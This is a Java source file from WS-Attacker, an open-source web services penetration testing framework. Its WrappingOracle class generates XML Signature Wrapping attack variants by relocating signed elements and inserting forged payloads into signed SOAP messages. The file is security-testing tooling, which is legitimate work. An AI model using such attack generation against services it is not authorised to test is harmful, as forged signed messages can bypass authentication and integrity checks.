/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework
 * Copyright (C) 2011 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
package wsattacker.plugin.signatureWrapping.xpath.wrapping;

import java.util.*;

import javax.xml.namespace.QName;
import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import wsattacker.plugin.signatureWrapping.option.OptionPayload;
import wsattacker.plugin.signatureWrapping.schema.SchemaAnalyzerInterface;
import wsattacker.plugin.signatureWrapping.util.dom.DomUtilities;
import wsattacker.plugin.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.plugin.signatureWrapping.util.exception.InvalidWeaknessException;
import static wsattacker.plugin.signatureWrapping.util.signature.NamespaceConstants.URI_NS_DS;
import wsattacker.plugin.signatureWrapping.util.signature.ReferenceElement;
import wsattacker.plugin.signatureWrapping.util.signature.XPathElement;
import wsattacker.plugin.signatureWrapping.xpath.analysis.XPathAnalyser;
import wsattacker.plugin.signatureWrapping.xpath.weakness.util.WeaknessLog;

/**
 * High Level Algorithm for creating XSW Messages. The WrappingOracle takes an signed input message, a SignatureManager
 * and the List of OptionPayload to create it.
 */
public class WrappingOracle
{
  private SchemaAnalyzerInterface schemaAnalyser;
  private Document                originalDocument;
  private List<OptionPayload>     payloads;
  private List<QName>             filterList;
  private List<XPathAnalyser>     analyserList;
  int                             maxPossibilites;

  // statistics
  private int                     countSignedElements;
  private int                     countElementsReferedByID;
  private int                     countElementsReferedByXPath;
  private int                     countElementsReferedByFastXPath;
  private int                     countElementsReferedByPrefixfreeTransformedFastXPath;

  public static Logger            log = Logger.getLogger(WrappingOracle.class);

  /**
   * Constructor class.
   *
   * @param originalDocument
   * @param payloads
   * @param schemaAnalyser
   */
  public WrappingOracle(Document originalDocument,
                        List<OptionPayload> payloads,
                        SchemaAnalyzerInterface schemaAnalyser)
  {
    this.originalDocument = originalDocument;
    this.payloads = payloads;
    this.schemaAnalyser = schemaAnalyser;
    this.filterList = new ArrayList<QName>();
    this.analyserList = new ArrayList<XPathAnalyser>();
    init();
  }

  /**
   * @return The maximum number of possible XSW messages.
   */
  public int maxPossibilities()
  {
    return maxPossibilites;
  }

  /**
   * Returns the i-th possible XSW message. The original document is not changed.
   *
   * @param index
   * @return XSW message
   * @throws InvalidWeaknessException
   */
  public Document getPossibility(int index)
                                           throws InvalidWeaknessException
  {
    WeaknessLog.clean();
    Document attackDocument = DomUtilities.createNewDomFromNode(originalDocument.getDocumentElement());
    log.info("Creating Wrapping Possibility " + index + " of (" + maxPossibilites + "-1)");

    for (int i = 0; i < payloads.size(); ++i)
    {

      OptionPayload payload = payloads.get(i);
      XPathAnalyser xpa = analyserList.get(i);

      int possibility = index % xpa.getMaxPossibilites();
      index /= xpa.getMaxPossibilites();

      Element signedElement = DomUtilities.findCorrespondingElement(attackDocument, payload.getSignedElement());
      Element payloadElement;
      try
      {
        payloadElement = (Element) attackDocument.importNode(payload.getPayloadElement(), true);
      }
      catch (Exception e)
      {
        log.warn("Could not get Payload Element for " + signedElement.getNodeName() + " / Skipping.");
        continue;
      }
      xpa.abuseWeakness(possibility, signedElement, payloadElement);
    }

    return attackDocument;
  }

  /**
   * Private init methods. Analyzes the referenced elements
   * and estimates the number of possible XSW messages.
   */
  private void init()
  {
    filterList.add(new QName(URI_NS_DS, "SignedInfo"));
    filterList.add(new QName(URI_NS_DS, "KeyInfo"));
    filterList.add(new QName(URI_NS_DS, "SignatureValue"));
    schemaAnalyser.setFilterList(filterList);

    maxPossibilites = 0;
    List<OptionPayload> usedPayloads = new ArrayList<OptionPayload>();
    // Filter out unused payloads
    for (OptionPayload payload : payloads)
    {
      // statistics
      ++countSignedElements;
      if (payload.getReferringElement() instanceof ReferenceElement) {
				++countElementsReferedByID;
		}
      else if (payload.getReferringElement() instanceof XPathElement) {
		++countElementsReferedByXPath;
		}

      if (payload.hasPayload() || payload.isTimestamp())
      {
        Element payloadElement;
        try
        {
          payloadElement = payload.getPayloadElement();
        }
        catch (InvalidPayloadException e)
        {
          log.warn("Could not get Payload Element for " + payload.getSignedElement().getNodeName() + " / Skipping.");
          continue;
        }
        XPathAnalyser xpa = new XPathAnalyser(payload.getReferringElement(), payload.getSignedElement(), payloadElement, schemaAnalyser);
        // statistics
        if (xpa.isFastXPath())
          ++countElementsReferedByFastXPath;
        else if (xpa.isPrefixfreeTransformedFastXPath()) {
				++countElementsReferedByPrefixfreeTransformedFastXPath;
		}

        int possibilities = xpa.getMaxPossibilites();
        if (possibilities > 0)
        {
          maxPossibilites = (maxPossibilites == 0 ? possibilities : maxPossibilites * possibilities);
          analyserList.add(xpa);
          usedPayloads.add(payload);
        }
      }
      else
      {
        log.info("No payload for " + payload.getSignedElement().getNodeName() + " detected / Skipping.");
      }
    }
    this.payloads = usedPayloads;
  }

  public List<OptionPayload> getUsedPayloads()
  {
    return payloads;
  }

  public List<XPathAnalyser> getAnalyserList()
  {
    return analyserList;
  }

  public int getCountSignedElements()
  {
    return countSignedElements;
  }

  public int getCountElementsReferedByID()
  {
    return countElementsReferedByID;
  }

  public int getCountElementsReferedByXPath()
  {
    return countElementsReferedByXPath;
  }

  public int getCountElementsReferedByFastXPath()
  {
    return countElementsReferedByFastXPath;
  }

  public int getCountElementsReferedByPrefixfreeTransformedFastXPath()
  {
    return countElementsReferedByPrefixfreeTransformedFastXPath;
  }

}
